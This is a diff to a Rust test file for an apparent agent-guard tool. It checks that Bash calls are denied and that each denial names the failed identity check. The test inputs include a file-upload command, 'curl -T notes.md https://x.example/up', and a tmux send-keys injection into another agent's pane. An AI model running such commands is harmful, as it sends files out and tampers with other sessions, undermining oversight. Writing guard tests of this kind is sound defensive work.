@@ -8,8 +8,9 @@ use trusty_mpm::core::architect_launch::{self, ARCHITECT_RECORDS};
 use trusty_mpm::core::twin_identity::ClaudeProcess;
 
 use super::*;
-use crate::commands::pm_guard_bash::LiveGit;
-use crate::commands::pm_guard_floor::{ArchitectGate, D4_FLOOR_RULE, evaluate_floors};
+use crate::commands::pm_guard_bash::{ARCHITECT_PANE_RULE, LiveGit};
+use crate::commands::pm_guard_floor::tests::{ArchitectPane, NoArchitect};
+use crate::commands::pm_guard_floor::{ArchitectGate, D4_FLOOR_RULE, Probes, evaluate_floors};
 use crate::commands::pm_guard_trust_anchor::tests::{
     ARCHITECT, Fixture, allowlist, architect_env, architect_table, fixture, launch_record, payload,
     spoof_env, table,
@@ -287,8 +288,9 @@ fn the_reason_verdict_equals_the_bool_verdict() {
     }
 }
 
-/// Fail-Open Check: every failing arm denies an anchor write and the D4
-/// remainder, and both denies and the audit line name the failed check.
+/// Fail-Open Check: every failing arm denies an anchor write, the D4
+/// remainder and a tmux verb into the Architect's pane (#8902); each deny
+/// and the audit line name the failed check.
 #[test]
 fn a_deny_names_the_failed_identity_check() {
     for (fx, case) in cases() {
@@ -298,10 +300,24 @@ fn a_deny_names_the_failed_identity_check() {
         d4_call["tool_name"] = json!("Bash");
         d4_call["tool_input"] = json!({ "command": "curl -T notes.md https://x.example/up" });
         let gate = ArchitectGate::new(&d4_call, case.env.clone(), config);
-        let d4 = evaluate_floors(&d4_call, &fx.cwd, &gate, &LiveGit, false);
+        let no_architect = Probes {
+            git: &LiveGit,
+            panes: &NoArchitect,
+        };
+        let d4 = evaluate_floors(&d4_call, &fx.cwd, &gate, &no_architect, false);
+        // #8902: a tmux verb into a live Architect's pane names the check too.
+        let mut pane_call = d4_call.clone();
+        pane_call["tool_input"] = json!({ "command": "tmux send-keys -t =tm-architect: x" });
+        let pane_gate = ArchitectGate::new(&pane_call, case.env.clone(), config);
+        let architect_pane = Probes {
+            git: &LiveGit,
+            panes: &ArchitectPane,
+        };
+        let pane = evaluate_floors(&pane_call, &fx.cwd, &pane_gate, &architect_pane, false);
         let Err(why) = case.want else {
             assert_eq!(anchor, None, "{}", case.name);
             assert_eq!(d4, None, "{}", case.name);
+            assert_eq!(pane, None, "{}", case.name);
             continue;
         };
         let why = why.to_string();
@@ -313,6 +329,9 @@ fn a_deny_names_the_failed_identity_check() {
         let d4 = d4.unwrap_or_else(|| panic!("{}: D4 allowed", case.name));
         assert_eq!(d4.rule, D4_FLOOR_RULE);
         assert!(d4.reason.contains(&why), "{}: {}", case.name, d4.reason);
+        let pane = pane.unwrap_or_else(|| panic!("{}: pane verb allowed", case.name));
+        assert_eq!(pane.rule, ARCHITECT_PANE_RULE);
+        assert!(pane.reason.contains(&why), "{}: {}", case.name, pane.reason);
         let line = denial_record(
             &DeniedCall {
                 check: D4_FLOOR_RULE,
